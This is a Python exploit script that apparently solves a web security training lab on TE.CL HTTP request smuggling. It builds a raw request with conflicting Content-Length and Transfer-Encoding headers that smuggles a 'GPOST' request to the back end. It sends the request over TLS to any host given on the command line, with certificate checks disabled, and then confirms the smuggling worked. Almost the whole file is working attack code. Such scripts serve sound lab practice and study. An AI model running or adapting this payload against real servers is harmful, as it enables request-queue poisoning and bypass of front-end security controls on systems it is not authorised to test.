import socket
import sys
import requests
import ssl
import urllib3

# Disable SSL warnings for cleaner output
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lab: HTTP request smuggling, basic TE.CL vulnerability

def TE_CL(target_host, target_port):
    """
    This function exploits a TE.CL vulnerability to perform HTTP request smuggling.
    The front-end server processes requests using Transfer-Encoding, while the back-end uses Content-Length.
    """

    # Construct the malicious payload
    # - The front-end server parses the request using Transfer-Encoding: chunked.
    # - The back-end server processes the payload based on Content-Length.
    # - The discrepancy allows us to smuggle a "GPOST" request to the back-end server.
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"  # Misleads the back-end into processing part of the payload
        "Transfer-Encoding: chunked\r\n"  # Used by the front-end to parse the request
        "\r\n"
        "56\r\n"  # Chunk size (86 bytes in hexadecimal)
        "GPOST / HTTP/1.1\r\n"  # Smuggled request to manipulate the back-end server
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "\r\n"
        "0\r\n"  # Terminates chunked encoding
        "\r\n"
    )

    # Establish a secure connection with the target server
    ssl_context = ssl.create_default_context()
    with socket.create_connection((target_host, target_port)) as sock:
        with ssl_context.wrap_socket(sock, server_hostname=target_host) as securesock:
            print("(+) Sending smuggling payload...")
            securesock.sendall(payload.encode())  # Send the malicious payload

            # Receive the response from the server
            response_smuggling = securesock.recv(4096)
            if "HTTP/1.1 200 OK" in response_smuggling.decode():
                print("(+) Payload sent successfully.")
                
                # Trigger the smuggled request
                normal_response = requests.get(f"https://{target_host}", verify=False)
                if "Unrecognized method GPOST" in normal_response.text:
                    print("(+) Request smuggled successfully.")
                    print("(+) Lab solved successfully.")
                    sys.exit()
                else:
                    print("(-) Error: Smuggled request was not executed as expected.")
            elif "504 Gateway Timeout" in response_smuggling.decode():
                # Handle timeout errors, which may indicate a blocked payload
                print("(-) No response received from the server.")
                sys.exit(1)
            else:
                # Handle unexpected responses
                print("(-) Unexpected Error occurred.")

def main():
    """
    Main function to parse command-line arguments and initiate the TE.CL attack.
    """
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = 443  # Default HTTPS port
    print("(+) Starting TE.CL request smuggling attack...")
    TE_CL(target_host, target_port)

if __name__ == "__main__":
    main()
